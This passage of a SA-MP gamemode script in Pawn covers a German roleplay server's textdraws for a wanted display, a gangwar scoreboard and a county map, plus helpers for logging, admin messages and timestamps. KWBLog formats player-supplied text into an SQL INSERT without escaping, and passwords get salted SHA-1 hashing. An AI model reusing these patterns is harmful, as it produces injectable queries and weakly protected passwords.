	PlayerTextDrawBackgroundColor(playerid,Wantedtext[1][playerid], 255);
	PlayerTextDrawFont(playerid,Wantedtext[1][playerid], 2);
	PlayerTextDrawLetterSize(playerid,Wantedtext[1][playerid], 0.320000, 1.300000);
	PlayerTextDrawColor(playerid,Wantedtext[1][playerid], -659023873);
	PlayerTextDrawSetOutline(playerid,Wantedtext[1][playerid], 0);
	PlayerTextDrawSetProportional(playerid,Wantedtext[1][playerid], 1);
	PlayerTextDrawSetShadow(playerid,Wantedtext[1][playerid], 0);
	PlayerTextDrawSetSelectable(playerid,Wantedtext[1][playerid], 0);
	PlayerTextDrawShow(playerid,Wantedtext[0][playerid]);
	PlayerTextDrawShow(playerid,Wantedtext[1][playerid]);
	return 1;
}
IsLeapYear(year)
{
	if(year % 4 == 0) return 1;
	else return 0;
}
TimestampToDate(Timestamp, &year, &month, &day, &hour, &minute, &second, HourGMT = 1, MinuteGMT = 0)
{
	new tmp = 2;
	year = 1970;
	month = 1;
	for(;;)
	{
		if(Timestamp >= 31536000)
		{
			year ++;
			Timestamp -= 31536000;
			tmp ++;
			if(tmp == 4)
			{
				if(Timestamp >= 31622400)
				{
					tmp = 0;
					year ++;
					Timestamp -= 31622400;
				}
				else break;
			}
		}
		else break;
	}
	for(new i = 0; i < 12; i ++)
	{
		if(Timestamp >= MonthTimes[i][2])
		{
			month ++;
			Timestamp -= MonthTimes[i][2];
		}
		else break;
	}
	day = 1 + (Timestamp / 86400);
	Timestamp %= 86400;
	hour = HourGMT + (Timestamp / 3600);
	Timestamp %= 3600;
	minute = MinuteGMT + (Timestamp / 60);
	second = (Timestamp % 60);
	if(minute > 59)
	{
		minute = 0;
		hour ++;
		if(hour > 23)
		{
			hour -= 24;
			day ++;
			if(day > MonthTimes[month][IsLeapYear(year)])
			{
				day = 1;
				month ++;
				if(month > 12)
				{
					month = 1;
					year ++;
				}
			}
		}
	}
	return 1;
}
forward Freeze(playerid);
public Freeze(playerid)
{
	TogglePlayerControllable(playerid,false);
	return 1;
}
forward Unfreeze(playerid);
public Unfreeze(playerid)
{
	TogglePlayerControllable(playerid,true);
	return 1;
}
KWBLog(const name[MAX_PLAYER_NAME],const admin[MAX_PLAYER_NAME],const aktion[9],const grund[])
{
	new playerid = GetPlayerID(name);
	new ip[16],query[256];
	GetPlayerIp(playerid,ip,sizeof ip);
	format(query,sizeof(query),"INSERT INTO kwbLog (Name,IP,Admin,Aktion,Grund) VALUES ('%s','%s','%s','%s','%s')",
	name,
	ip,
	admin,
	aktion,
	grund
	);
	mysql_query(dbhandle, query);
	printf("%s",query);
}
SendMessageToAll(color, const string[])
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(IsPlayerConnected(i) && !IsPlayerNPC(i) && SpielerInfo[i][uEingeloggt] == 1)
	    {
	        SendClientMessage(i,color,string);
	    }
	}
	return 1;
}
stock SendAdminMessage(color,const string[],level)
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i) && SpielerInfo[i][uAdmin] >= level)
		{
			SendClientMessage(i, color, string);
		}
	}
	return 1;
}
verschluesseln(const passwort[], const dbsalt[41])
{
	new string3[82],string[41];
	sha1(passwort,string);
	format(string3,sizeof(string3),"%s%s",dbsalt,string);
	sha1(string3,string);
	return string;
}
/*public OnMysqlQuery(resultid, spareid, MySQL:handle)
{
    //
	switch (resultid)
	{
		case MYSQL_API_CHECK:
		{
		    new string[128], typ, tmp[10],adminname[MAX_PLAYER_NAME], playername[MAX_PLAYER_NAME], grund[256], wert, apiid, adminid;

		    if(mysql_num_rows()==0)return 1;
		    for(new i=0; i<mysql_num_rows(); i++)
		    {
		        mysql_fetch_field("typ", tmp);
		        typ = strval(tmp);
				mysql_fetch_field("wert", tmp);
				wert = strval(tmp);
				mysql_fetch_field("id", tmp);
                apiid = strval(tmp);
				mysql_fetch_field("playername", playername);
				mysql_fetch_field("adminname", adminname);
				mysql_fetch_field("admin", tmp);
				adminid = strval(tmp);
				mysql_fetch_field("grund", grund);
		        format(string, sizeof(string), "DELETE FROM ServerAPI WHERE id='%i'", apiid);
          mysql_query(dbhandle, string);

		        UpdateApiTyp(typ, adminname, playername, grund, wert, adminid);
		    }
		}
	}
	return 1;
}
*/
/*getPlayeridByUsername(playername[])
{
	new pID = -1, username[MAX_PLAYER_NAME];
    for(new i=0; i <= GetPlayerPoolSize(); i++)
    {
        if(!IsPlayerConnected(i))continue;
        GetPlayerName(i, username, sizeof(username));
        if(!strcmp(username, playername, true))
        {
            return i;
   		}
   		break;
    }
    return pID;
}
forward UpdateApiTyp(typ, adminname[MAX_PLAYER_NAME], playername[], grund[], wert, adminid);
public UpdateApiTyp(typ, adminname[MAX_PLAYER_NAME], playername[], grund[], wert, adminid)
{
	new text[100], pID;
    if(typ==1)
    {
        print("Typ 1");
        pID = getPlayeridByUsername(playername);
        printf("%d pid",pID);
        format(text, sizeof(text), "%s wurde von %s gekickt. [%s]", playername, adminname, grund);
        SendFormatMessage(pID, COLOR_RED, "[API]* Du wurdest von %s gekickt. [%s]", adminname, grund);
        SetTimerEx("KICKHIM", 300, false, "d", pID);
    }
    new nachricht[144];
    format(nachricht, sizeof(nachricht), "{00FF00}>> [API] {FFFFFF}%s {00FF00}<<", text);
    SendAdminMessage(0x00FF00FF ,nachricht,1);
    return 1;
}
*/

forward TextDraws();
public TextDraws()
{
	GangwarT[0] = TextDrawCreate(54.000000, 290.000000, "Team1"); //team1
	TextDrawBackgroundColor(GangwarT[0], 0xFEFEFEFF);
	TextDrawFont(GangwarT[0], 2);
	TextDrawLetterSize(GangwarT[0], 0.470000, 1.600000);
	TextDrawColor(GangwarT[0], -1);
	TextDrawSetOutline(GangwarT[0], 1);
	TextDrawSetProportional(GangwarT[0], 1);

	GangwarT[1] = TextDrawCreate(115.000000, 290.000000, "Team2");//team2
	TextDrawBackgroundColor(GangwarT[1], 0xFEFEFEFF);
	TextDrawFont(GangwarT[1], 2);
	TextDrawLetterSize(GangwarT[1], 0.470000, 1.600000);
	TextDrawColor(GangwarT[1], -1);
	TextDrawSetOutline(GangwarT[1], 1);
	TextDrawSetProportional(GangwarT[1], 1);

	GangwarT[2] = TextDrawCreate(46.000000, 315.000000, "Kills");//killteam1
	TextDrawBackgroundColor(GangwarT[2], 387455698);
	TextDrawFont(GangwarT[2], 1);
	TextDrawLetterSize(GangwarT[2], 0.230000, 1.000000);
	TextDrawColor(GangwarT[2], -1);
	TextDrawSetOutline(GangwarT[2], 1);
	TextDrawSetProportional(GangwarT[2], 1);

	GangwarT[3] = TextDrawCreate(108.000000, 315.000000, "Kills");//killteam2
	TextDrawBackgroundColor(GangwarT[3], 387455698);
	TextDrawFont(GangwarT[3], 1);
	TextDrawLetterSize(GangwarT[3], 0.230000, 1.000000);
	TextDrawColor(GangwarT[3], -1);
	TextDrawSetOutline(GangwarT[3], 1);
	TextDrawSetProportional(GangwarT[3], 1);

	GangwarT[4] = TextDrawCreate(84.000000, 295.000000, "VS.");
	TextDrawBackgroundColor(GangwarT[4], 387455698);
	TextDrawFont(GangwarT[4], 1);
	TextDrawLetterSize(GangwarT[4], 0.230000, 1.000000);
	TextDrawColor(GangwarT[4], -1);
	TextDrawSetOutline(GangwarT[4], 1);
	TextDrawSetProportional(GangwarT[4], 1);

    county_map[0] = TextDrawCreate(650.000000, 0.000000, "I");
	TextDrawBackgroundColor(county_map[0], 255);
	TextDrawFont(county_map[0], 1);
	TextDrawLetterSize(county_map[0], 0.000000, 50.000000);
	TextDrawColor(county_map[0], -1);
	TextDrawSetOutline(county_map[0], 0);
	TextDrawSetProportional(county_map[0], 1);
	TextDrawSetShadow(county_map[0], 1);
	TextDrawUseBox(county_map[0], 1);
	TextDrawBoxColor(county_map[0], 255);
	TextDrawTextSize(county_map[0], -10.000000, 0.000000);

	county_map[1] = TextDrawCreate(250.000000, 100.000000, "county islands map");
	TextDrawBackgroundColor(county_map[1], 255);
	TextDrawFont(county_map[1], 3);
	TextDrawLetterSize(county_map[1], 0.500000, 3.000000);
	TextDrawColor(county_map[1], -943339521);
	TextDrawSetOutline(county_map[1], 0);
	TextDrawSetProportional(county_map[1], 1);
	TextDrawSetShadow(county_map[1], 1);

	county_map[2] = TextDrawCreate(550.000000, 140.000000, "I");
	TextDrawBackgroundColor(county_map[2], 255);
	TextDrawFont(county_map[2], 1);
	TextDrawLetterSize(county_map[2], 0.000000, 31.000000);
	TextDrawColor(county_map[2], -1);
	TextDrawSetOutline(county_map[2], 0);
	TextDrawSetProportional(county_map[2], 1);
	TextDrawSetShadow(county_map[2], 1);
	TextDrawUseBox(county_map[2], 1);
	TextDrawBoxColor(county_map[2], -774448230);
	TextDrawTextSize(county_map[2], 90.000000, 0.000000);

	county_map[3] = TextDrawCreate(150.000000, 142.000000, ".");
	TextDrawBackgroundColor(county_map[3], 255);
	TextDrawFont(county_map[3], 1);
	TextDrawLetterSize(county_map[3], 0.000000, 7.299999);
	TextDrawColor(county_map[3], -1);
	TextDrawSetOutline(county_map[3], 0);
	TextDrawSetProportional(county_map[3], 1);
	TextDrawSetShadow(county_map[3], 1);
	TextDrawUseBox(county_map[3], 1);
	TextDrawBoxColor(county_map[3], 1296780017);
	TextDrawTextSize(county_map[3], 120.000000, 0.000000);

	county_map[4] = TextDrawCreate(130.000000, 211.000000, ".");
	TextDrawBackgroundColor(county_map[4], 255);
	TextDrawFont(county_map[4], 1);
	TextDrawLetterSize(county_map[4], 0.000000, 3.400000);
	TextDrawColor(county_map[4], -1);
	TextDrawSetOutline(county_map[4], 0);
	TextDrawSetProportional(county_map[4], 1);
	TextDrawSetShadow(county_map[4], 1);
	TextDrawUseBox(county_map[4], 1);
	TextDrawBoxColor(county_map[4], 1296780017);
	TextDrawTextSize(county_map[4], 120.000000, 0.000000);

	county_map[5] = TextDrawCreate(130.000000, 245.000000, ".");
	TextDrawBackgroundColor(county_map[5], 255);
	TextDrawFont(county_map[5], 1);
	TextDrawLetterSize(county_map[5], 0.000000, 4.000000);
	TextDrawColor(county_map[5], -1);
	TextDrawSetOutline(county_map[5], 0);
	TextDrawSetProportional(county_map[5], 1);
	TextDrawSetShadow(county_map[5], 1);
	TextDrawUseBox(county_map[5], 1);
	TextDrawBoxColor(county_map[5], 1296780017);
	TextDrawTextSize(county_map[5], 111.000000, 0.000000);

	county_map[6] = TextDrawCreate(130.000000, 284.000000, ".");
	TextDrawBackgroundColor(county_map[6], 255);
	TextDrawFont(county_map[6], 1);
	TextDrawLetterSize(county_map[6], 0.000000, 0.400000);
	TextDrawColor(county_map[6], -1);
	TextDrawSetOutline(county_map[6], 0);
	TextDrawSetProportional(county_map[6], 1);
	TextDrawSetShadow(county_map[6], 1);
	TextDrawUseBox(county_map[6], 1);
	TextDrawBoxColor(county_map[6], 1296780017);
	TextDrawTextSize(county_map[6], 120.000000, 0.000000);

	county_map[7] = TextDrawCreate(150.000000, 291.000000, ".");
	TextDrawBackgroundColor(county_map[7], 255);
	TextDrawFont(county_map[7], 1);
	TextDrawLetterSize(county_map[7], 0.000000, 4.300000);
	TextDrawColor(county_map[7], -1);
	TextDrawSetOutline(county_map[7], 0);
	TextDrawSetProportional(county_map[7], 1);
	TextDrawSetShadow(county_map[7], 1);
	TextDrawUseBox(county_map[7], 1);
	TextDrawBoxColor(county_map[7], 1296780017);
	TextDrawTextSize(county_map[7], 111.000000, 0.000000);

	county_map[8] = TextDrawCreate(150.000000, 333.000000, ".");
	TextDrawBackgroundColor(county_map[8], 255);
	TextDrawFont(county_map[8], 1);
	TextDrawLetterSize(county_map[8], 0.000000, 2.799998);
	TextDrawColor(county_map[8], -1);
	TextDrawSetOutline(county_map[8], 0);
	TextDrawSetProportional(county_map[8], 1);
	TextDrawSetShadow(county_map[8], 1);
	TextDrawUseBox(county_map[8], 1);
	TextDrawBoxColor(county_map[8], 1296780017);
	TextDrawTextSize(county_map[8], 134.000000, -12.000000);

	county_map[9] = TextDrawCreate(137.000000, 333.000000, ".");
	TextDrawBackgroundColor(county_map[9], 255);
	TextDrawFont(county_map[9], 1);
	TextDrawLetterSize(county_map[9], 0.000000, 0.899999);
	TextDrawColor(county_map[9], -1);
	TextDrawSetOutline(county_map[9], 0);
	TextDrawSetProportional(county_map[9], 1);
	TextDrawSetShadow(county_map[9], 1);
	TextDrawUseBox(county_map[9], 1);
	TextDrawBoxColor(county_map[9], 1296780017);
	TextDrawTextSize(county_map[9], 124.000000, -12.000000);

	county_map[10] = TextDrawCreate(150.000000, 361.000000, ".");
	TextDrawBackgroundColor(county_map[10], 255);
	TextDrawFont(county_map[10], 1);
	TextDrawLetterSize(county_map[10], 0.000000, 1.700000);
	TextDrawColor(county_map[10], -1);
	TextDrawSetOutline(county_map[10], 0);
	TextDrawSetProportional(county_map[10], 1);
	TextDrawSetShadow(county_map[10], 1);
	TextDrawUseBox(county_map[10], 1);
	TextDrawBoxColor(county_map[10], 1296780017);
	TextDrawTextSize(county_map[10], 104.000000, -12.000000);

	county_map[11] = TextDrawCreate(150.000000, 379.000000, ".");
	TextDrawBackgroundColor(county_map[11], 255);
	TextDrawFont(county_map[11], 1);
	TextDrawLetterSize(county_map[11], 0.000000, 4.299999);
	TextDrawColor(county_map[11], -1);
	TextDrawSetOutline(county_map[11], 0);
	TextDrawSetProportional(county_map[11], 1);
	TextDrawSetShadow(county_map[11], 1);
	TextDrawUseBox(county_map[11], 1);
	TextDrawBoxColor(county_map[11], 1296780017);
	TextDrawTextSize(county_map[11], 91.000000, -12.000000);

	county_map[12] = TextDrawCreate(490.000000, 372.000000, ".");
	TextDrawBackgroundColor(county_map[12], 255);
	TextDrawFont(county_map[12], 1);
	TextDrawLetterSize(county_map[12], 0.000000, 2.299998);
	TextDrawColor(county_map[12], -1);
	TextDrawSetOutline(county_map[12], 0);
	TextDrawSetProportional(county_map[12], 1);
	TextDrawSetShadow(county_map[12], 1);
	TextDrawUseBox(county_map[12], 1);
	TextDrawBoxColor(county_map[12], 1296780017);
	TextDrawTextSize(county_map[12], 147.000000, -12.000000);

	county_map[13] = TextDrawCreate(530.000000, 350.000000, ".");
	TextDrawBackgroundColor(county_map[13], 255);
	TextDrawFont(county_map[13], 1);
	TextDrawLetterSize(county_map[13], 0.000000, 6.599998);
	TextDrawColor(county_map[13], -1);
	TextDrawSetOutline(county_map[13], 0);
	TextDrawSetProportional(county_map[13], 1);
	TextDrawSetShadow(county_map[13], 1);
	TextDrawUseBox(county_map[13], 1);
	TextDrawBoxColor(county_map[13], 1296780017);
	TextDrawTextSize(county_map[13], 487.000000, -12.000000);

	county_map[14] = TextDrawCreate(514.000000, 305.000000, ".");
	TextDrawBackgroundColor(county_map[14], 255);
	TextDrawFont(county_map[14], 1);
	TextDrawLetterSize(county_map[14], 0.000000, 4.599998);
	TextDrawColor(county_map[14], -1);
	TextDrawSetOutline(county_map[14], 0);
	TextDrawSetProportional(county_map[14], 1);
	TextDrawSetShadow(county_map[14], 1);
	TextDrawUseBox(county_map[14], 1);
	TextDrawBoxColor(county_map[14], 1296780017);
	TextDrawTextSize(county_map[14], 487.000000, -12.000000);

	county_map[15] = TextDrawCreate(498.000000, 288.000000, ".");
	TextDrawBackgroundColor(county_map[15], 255);
	TextDrawFont(county_map[15], 1);
	TextDrawLetterSize(county_map[15], 0.000000, 1.599998);
	TextDrawColor(county_map[15], -1);
	TextDrawSetOutline(county_map[15], 0);
	TextDrawSetProportional(county_map[15], 1);
	TextDrawSetShadow(county_map[15], 1);
	TextDrawUseBox(county_map[15], 1);
	TextDrawBoxColor(county_map[15], 1296780017);
	TextDrawTextSize(county_map[15], 493.000000, -12.000000);

	county_map[16] = TextDrawCreate(514.000000, 215.000000, ".");
	TextDrawBackgroundColor(county_map[16], 255);
	TextDrawFont(county_map[16], 1);
	TextDrawLetterSize(county_map[16], 0.000000, 7.799999);
	TextDrawColor(county_map[16], -1);
	TextDrawSetOutline(county_map[16], 0);
	TextDrawSetProportional(county_map[16], 1);
	TextDrawSetShadow(county_map[16], 1);
	TextDrawUseBox(county_map[16], 1);
	TextDrawBoxColor(county_map[16], 1296780017);
	TextDrawTextSize(county_map[16], 487.000000, -12.000000);

	county_map[17] = TextDrawCreate(514.000000, 142.000000, ".");
	TextDrawBackgroundColor(county_map[17], 255);
	TextDrawFont(county_map[17], 1);
	TextDrawLetterSize(county_map[17], 0.000000, 7.799999);
	TextDrawColor(county_map[17], -1);
	TextDrawSetOutline(county_map[17], 0);
	TextDrawSetProportional(county_map[17], 1);
	TextDrawSetShadow(county_map[17], 1);
	TextDrawUseBox(county_map[17], 1);
	TextDrawBoxColor(county_map[17], 1296780017);
	TextDrawTextSize(county_map[17], 487.000000, -12.000000);

	county_map[18] = TextDrawCreate(549.000000, 142.000000, ".");
	TextDrawBackgroundColor(county_map[18], 255);
	TextDrawFont(county_map[18], 1);
	TextDrawLetterSize(county_map[18], 0.000000, 6.199997);
	TextDrawColor(county_map[18], -1);
	TextDrawSetOutline(county_map[18], 0);
	TextDrawSetProportional(county_map[18], 1);
	TextDrawSetShadow(county_map[18], 1);
	TextDrawUseBox(county_map[18], 1);
	TextDrawBoxColor(county_map[18], 1296780017);
	TextDrawTextSize(county_map[18], 511.000000, -12.000000);

	county_map[19] = TextDrawCreate(542.000000, 201.000000, ".");
	TextDrawBackgroundColor(county_map[19], 255);
	TextDrawFont(county_map[19], 1);
	TextDrawLetterSize(county_map[19], 0.000000, 1.299998);
	TextDrawColor(county_map[19], -1);
	TextDrawSetOutline(county_map[19], 0);
	TextDrawSetProportional(county_map[19], 1);
	TextDrawSetShadow(county_map[19], 1);
	TextDrawUseBox(county_map[19], 1);
	TextDrawBoxColor(county_map[19], 1296780017);
	TextDrawTextSize(county_map[19], 516.000000, -25.000000);

	county_map[20] = TextDrawCreate(490.000000, 187.000000, ".");
	TextDrawBackgroundColor(county_map[20], 255);
	TextDrawFont(county_map[20], 1);
	TextDrawLetterSize(county_map[20], 0.000000, 1.299998);
	TextDrawColor(county_map[20], -1);
	TextDrawSetOutline(county_map[20], 0);
	TextDrawSetProportional(county_map[20], 1);
	TextDrawSetShadow(county_map[20], 1);
	TextDrawUseBox(county_map[20], 1);
	TextDrawBoxColor(county_map[20], 1296780017);
	TextDrawTextSize(county_map[20], 147.000000, -25.000000);

	county_map[21] = TextDrawCreate(356.000000, 141.000000, ".");
	TextDrawBackgroundColor(county_map[21], 255);
	TextDrawFont(county_map[21], 1);
	TextDrawLetterSize(county_map[21], 0.000000, 3.299998);
	TextDrawColor(county_map[21], -1);
	TextDrawSetOutline(county_map[21], 0);
	TextDrawSetProportional(county_map[21], 1);
	TextDrawSetShadow(county_map[21], 1);
	TextDrawUseBox(county_map[21], 1);
	TextDrawBoxColor(county_map[21], 1296780017);
	TextDrawTextSize(county_map[21], 277.000000, -25.000000);

	county_map[22] = TextDrawCreate(322.000000, 174.000000, ".");
	TextDrawBackgroundColor(county_map[22], 255);
	TextDrawFont(county_map[22], 1);
	TextDrawLetterSize(county_map[22], 0.000000, 1.099997);
	TextDrawColor(county_map[22], -1);
	TextDrawSetOutline(county_map[22], 0);
	TextDrawSetProportional(county_map[22], 1);
	TextDrawSetShadow(county_map[22], 1);
	TextDrawUseBox(county_map[22], 1);
	TextDrawBoxColor(county_map[22], 1296780017);
	TextDrawTextSize(county_map[22], 310.000000, -25.000000);

	county_map[23] = TextDrawCreate(322.000000, 202.000000, ".");
	TextDrawBackgroundColor(county_map[23], 255);
	TextDrawFont(county_map[23], 1);
	TextDrawLetterSize(county_map[23], 0.000000, 18.499996);
	TextDrawColor(county_map[23], -1);
	TextDrawSetOutline(county_map[23], 0);
	TextDrawSetProportional(county_map[23], 1);
	TextDrawSetShadow(county_map[23], 1);
	TextDrawUseBox(county_map[23], 1);
	TextDrawBoxColor(county_map[23], 1296780017);
	TextDrawTextSize(county_map[23], 310.000000, -25.000000);

	county_map[24] = TextDrawCreate(313.000000, 273.000000, ".");
	TextDrawBackgroundColor(county_map[24], 255);
	TextDrawFont(county_map[24], 1);
	TextDrawLetterSize(county_map[24], 0.000000, 10.599995);
	TextDrawColor(county_map[24], -1);
	TextDrawSetOutline(county_map[24], 0);
	TextDrawSetProportional(county_map[24], 1);
	TextDrawSetShadow(county_map[24], 1);
	TextDrawUseBox(county_map[24], 1);
	TextDrawBoxColor(county_map[24], 1296780017);
	TextDrawTextSize(county_map[24], 250.000000, -25.000000);

	county_map[25] = TextDrawCreate(293.000000, 273.000000, ".");
	TextDrawBackgroundColor(county_map[25], 255);
	TextDrawFont(county_map[25], 1);
	TextDrawLetterSize(county_map[25], 0.000000, 6.599996);
	TextDrawColor(county_map[25], -1);
	TextDrawSetOutline(county_map[25], 0);
	TextDrawSetProportional(county_map[25], 1);
	TextDrawSetShadow(county_map[25], 1);
	TextDrawUseBox(county_map[25], 1);
	TextDrawBoxColor(county_map[25], 1094665201);
	TextDrawTextSize(county_map[25], 224.000000, -25.000000);

	county_map[26] = TextDrawCreate(118.000000, 155.000000, "Villbeach");
	TextDrawBackgroundColor(county_map[26], 255);
	TextDrawFont(county_map[26], 1);
	TextDrawLetterSize(county_map[26], 0.230000, 1.000000);
	TextDrawColor(county_map[26], -404429602);
	TextDrawSetOutline(county_map[26], 0);
	TextDrawSetProportional(county_map[26], 1);
	TextDrawSetShadow(county_map[26], 1);
	TextDrawTextSize(county_map[26],155.0, 10.0);
	TextDrawSetSelectable(county_map[26],true);

	county_map[27] = TextDrawCreate(298.000000, 149.000000, "Portland");
	TextDrawBackgroundColor(county_map[27], 255);
	TextDrawFont(county_map[27], 1);
	TextDrawLetterSize(county_map[27], 0.230000, 1.000000);
	TextDrawColor(county_map[27], -404429602);
	TextDrawSetOutline(county_map[27], 0);
	TextDrawSetProportional(county_map[27], 1);
	TextDrawSetShadow(county_map[27], 1);
	TextDrawTextSize(county_map[27],335.0, 10.0);
	TextDrawSetSelectable(county_map[27],true);

	county_map[28] = TextDrawCreate(96.000000, 394.000000, "Lake Sorten");
	TextDrawBackgroundColor(county_map[28], 255);
	TextDrawFont(county_map[28], 1);
	TextDrawLetterSize(county_map[28], 0.230000, 1.000000);
	TextDrawColor(county_map[28], -404429602);
	TextDrawSetOutline(county_map[28], 0);
	TextDrawSetProportional(county_map[28], 1);
	TextDrawSetShadow(county_map[28], 1);
	TextDrawTextSize(county_map[28],145.0, 10.0);
	TextDrawSetSelectable(county_map[28],true);

	county_map[29] = TextDrawCreate(267.000000, 300.000000, "Wrong Hill");
	TextDrawBackgroundColor(county_map[29], 255);
	TextDrawFont(county_map[29], 1);
	TextDrawLetterSize(county_map[29], 0.230000, 1.000000);
	TextDrawColor(county_map[29], -404429602);
	TextDrawSetOutline(county_map[29], 0);
	TextDrawSetProportional(county_map[29], 1);
	TextDrawSetShadow(county_map[29], 1);
	TextDrawTextSize(county_map[29],313.0, 10.0);
	TextDrawSetSelectable(county_map[29],true);

	county_map[30] = TextDrawCreate(495.000000, 154.000000, "Santa Felton");
	TextDrawBackgroundColor(county_map[30], 255);
	TextDrawFont(county_map[30], 1);
	TextDrawLetterSize(county_map[30], 0.230000, 1.000000);
	TextDrawColor(county_map[30], -404429602);
	TextDrawSetOutline(county_map[30], 0);
	TextDrawSetProportional(county_map[30], 1);
	TextDrawSetShadow(county_map[30], 1);
	TextDrawTextSize(county_map[30],548.0, 10.0);
	TextDrawSetSelectable(county_map[30],true);

	county_map[31] = TextDrawCreate(480.000000, 377.000000, "Lake Vortex");
	TextDrawBackgroundColor(county_map[31], 255);
	TextDrawFont(county_map[31], 1);
	TextDrawLetterSize(county_map[31], 0.230000, 1.000000);
	TextDrawColor(county_map[31], -404429602);
	TextDrawSetOutline(county_map[31], 0);
	TextDrawSetProportional(county_map[31], 1);
	TextDrawSetShadow(county_map[31], 1);
	TextDrawTextSize(county_map[31],529.0, 10.0);
	TextDrawSetSelectable(county_map[31],true);

	county_map[32] = TextDrawCreate(103.000000, 119.000000, ".");
	TextDrawBackgroundColor(county_map[32], 255);
	TextDrawFont(county_map[32], 1);
	TextDrawLetterSize(county_map[32], 0.000000, 0.799996);
	TextDrawColor(county_map[32], -1);
	TextDrawSetOutline(county_map[32], 0);
	TextDrawSetProportional(county_map[32], 1);
	TextDrawSetShadow(county_map[32], 1);
	TextDrawUseBox(county_map[32], 1);
	TextDrawBoxColor(county_map[32], 1094665201);
	TextDrawTextSize(county_map[32], 89.000000, -25.000000);

	county_map[33] = TextDrawCreate(106.000000, 118.000000, "= Berg Region");
	TextDrawBackgroundColor(county_map[33], 255);
	TextDrawFont(county_map[33], 1);
	TextDrawLetterSize(county_map[33], 0.200000, 0.899999);
	TextDrawColor(county_map[33], -1);
	TextDrawSetOutline(county_map[33], 0);
	TextDrawSetProportional(county_map[33], 1);
	TextDrawSetShadow(county_map[33], 1);

	county_map[34] = TextDrawCreate(537.000000, 120.000000, "X");
	TextDrawBackgroundColor(county_map[34], 255);
	TextDrawFont(county_map[34], 2);
	TextDrawLetterSize(county_map[34], 0.410000, 1.600000);
	TextDrawColor(county_map[34], -1);
	TextDrawSetOutline(county_map[34], 0);
	TextDrawSetProportional(county_map[34], 1);
	TextDrawSetShadow(county_map[34], 1);
	TextDrawTextSize(county_map[34],550.0, 13.0);
	TextDrawSetSelectable(county_map[34],true);

	county_map[35] = TextDrawCreate(400.000000, 273.000000, ".");
	TextDrawBackgroundColor(county_map[35], 255);
	TextDrawFont(county_map[35], 1);
	TextDrawLetterSize(county_map[35], 0.000000, 6.799999);
	TextDrawColor(county_map[35], -1);
	TextDrawSetOutline(county_map[35], 0);
	TextDrawSetProportional(county_map[35], 1);
	TextDrawSetShadow(county_map[35], 1);
	TextDrawUseBox(county_map[35], 1);
	TextDrawBoxColor(county_map[35], 1296780017);
	TextDrawTextSize(county_map[35], 319.000000, 0.000000);

	county_map[36] = TextDrawCreate(350.000000, 284.000000, "???");
	TextDrawBackgroundColor(county_map[36], 255);
	TextDrawFont(county_map[36], 1);
	TextDrawLetterSize(county_map[36], 0.230000, 1.000000);
	TextDrawColor(county_map[36], -404429602);
	TextDrawSetOutline(county_map[36], 0);
	TextDrawSetProportional(county_map[36], 1);
	TextDrawSetShadow(county_map[36], 1);

	blitzerfl = TextDrawCreate(762.000000, -20.000000, "New Textdraw");
	TextDrawBackgroundColor(blitzerfl, 255);
	TextDrawFont(blitzerfl, 1);
	TextDrawLetterSize(blitzerfl, 2.399999, 35.000000);
	TextDrawColor(blitzerfl, -1);
	TextDrawSetOutline(blitzerfl, 0);
	TextDrawSetProportional(blitzerfl, 1);
	TextDrawSetShadow(blitzerfl, 1);
	TextDrawUseBox(blitzerfl, 1);
	TextDrawBoxColor(blitzerfl, -171);
	TextDrawTextSize(blitzerfl, -90.000000, 50.000000);
	TextDrawSetSelectable(blitzerfl, 0);
	
	atomtext[0] = TextDrawCreate(629.000000, 408.000000, "                  ");
	TextDrawBackgroundColor(atomtext[0], 255);
	TextDrawFont(atomtext[0], 0);
	TextDrawLetterSize(atomtext[0], 1.500000, 0.099999);
	TextDrawColor(atomtext[0], -1);
	TextDrawSetOutline(atomtext[0], 0);
	TextDrawSetProportional(atomtext[0], 1);
	TextDrawSetShadow(atomtext[0], 1);
	TextDrawUseBox(atomtext[0], 1);
	TextDrawBoxColor(atomtext[0], 100);
	TextDrawTextSize(atomtext[0], 557.000000, -5.000000);

	atomtext[1] = TextDrawCreate(576.000000, 409.000000, "VERSTRAHLT");
	TextDrawBackgroundColor(atomtext[1], 255);
	TextDrawFont(atomtext[1], 1);
	TextDrawLetterSize(atomtext[1], 0.240000, 1.400000);
	TextDrawColor(atomtext[1], -1);
	TextDrawSetOutline(atomtext[1], 0);
	TextDrawSetProportional(atomtext[1], 1);
	TextDrawSetShadow(atomtext[1], 0);

	atomtext[2] = TextDrawCreate(562.000000, 409.000000, "ld_shtr:ps3");
	TextDrawBackgroundColor(atomtext[2], 255);
	TextDrawFont(atomtext[2], 4);
	TextDrawLetterSize(atomtext[2], 0.500000, 1.000000);
	TextDrawColor(atomtext[2], -1);
	TextDrawSetOutline(atomtext[2], 0);
	TextDrawSetProportional(atomtext[2], 1);
	TextDrawSetShadow(atomtext[2], 1);
	TextDrawUseBox(atomtext[2], 1);
	TextDrawBoxColor(atomtext[2], 255);
	TextDrawTextSize(atomtext[2], 12.000000, 13.000000);

	UserBr[0] = TextDrawCreate(797.000000, 435.000000, "New Textdraw");
	TextDrawBackgroundColor(UserBr[0], 255);
	TextDrawFont(UserBr[0], 1);
	TextDrawLetterSize(UserBr[0], 0.500000, 1.000000);
	TextDrawColor(UserBr[0], -1);
	TextDrawSetOutline(UserBr[0], 0);
	TextDrawSetProportional(UserBr[0], 1);
	TextDrawSetShadow(UserBr[0], 1);
	TextDrawUseBox(UserBr[0], 1);
	TextDrawBoxColor(UserBr[0], 555753672);
	TextDrawTextSize(UserBr[0], 32.000000, 0.000000);

	UserBr[1] = TextDrawCreate(693.000000, 435.000000, "   ");
	TextDrawBackgroundColor(UserBr[1], 255);
	TextDrawFont(UserBr[1], 1);
	TextDrawLetterSize(UserBr[1], 0.500000, -0.200000);
	TextDrawColor(UserBr[1], -1);
	TextDrawSetOutline(UserBr[1], 0);
	TextDrawSetProportional(UserBr[1], 1);
	TextDrawSetShadow(UserBr[1], 1);
	TextDrawUseBox(UserBr[1], 1);
	TextDrawBoxColor(UserBr[1], -1508633400);
	TextDrawTextSize(UserBr[1], 32.000000, -43.000000);

	UserBr[2] = TextDrawCreate(-49.000000, 425.000000, "                        ");
	TextDrawBackgroundColor(UserBr[2], 255);
	TextDrawFont(UserBr[2], 1);
	TextDrawLetterSize(UserBr[2], 0.500000, 1.500000);
	TextDrawColor(UserBr[2], -1);
	TextDrawSetOutline(UserBr[2], 0);
